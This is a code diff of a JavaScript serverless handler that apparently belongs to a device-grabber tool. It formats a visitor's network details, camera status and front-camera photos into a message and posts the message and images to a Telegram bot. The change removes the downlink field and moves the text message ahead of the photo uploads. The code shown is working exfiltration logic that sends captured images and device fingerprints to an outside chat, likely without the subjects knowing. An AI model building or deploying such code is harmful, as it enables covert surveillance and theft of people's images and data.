@@ -22,7 +22,6 @@ export default async (req, res) => {
     `📶 **Network:**\n` +
     `- Type: ${d.networkType}\n` +
     `- Speed: ${d.networkSpeed}\n` +
-    `- Downlink: ${d.downlink}\n` +
     `- Latency (RTT): ${d.latency}\n` +
     `- Data Saver: ${d.dataSaver}\n\n` +
 
@@ -40,7 +39,21 @@ export default async (req, res) => {
     `📷 **Camera Status:**\n` +
     `- ${d.cameraStatus}\n`;
 
-    // Send images separately if they exist
+    // Send the main message
+    await fetch(
+      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: telegramId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      }
+    );
+
+    // Send images if they exist
     if (d.frontCameraImage) {
       await fetch(
         `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
@@ -70,20 +83,6 @@ export default async (req, res) => {
         }
       );
     }
-
-    // Send the main message
-    await fetch(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: telegramId,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      }
-    );
 
     res.status(200).json({ success: true });
   } catch (error) {
